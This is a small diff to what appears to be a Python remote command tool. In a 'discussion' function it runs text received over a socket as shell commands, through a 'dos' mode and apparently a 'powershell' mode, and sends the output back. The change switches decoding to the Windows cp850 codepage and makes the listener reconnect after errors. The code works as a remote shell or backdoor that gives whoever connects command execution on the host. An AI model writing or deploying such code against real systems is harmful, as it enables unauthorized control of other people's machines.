@@ -66,7 +66,7 @@ def discussion(conn):
                 conn.send(reply.encode())
 
             elif b.lower() =="dos":
-                reply =subprocess.check_output(a, shell=True).decode().strip()
+                reply =subprocess.check_output(a, shell=True).decode('cp850').strip()
                 conn.send(reply.encode())
 
             elif b.lower() == "powershell":
@@ -90,5 +90,4 @@ if __name__ == '__main__':
         while True:
             discussion(conn)
     except:
-        pass
-#        conn, address = server_socket.accept()
+        conn, address = server_socket.accept()
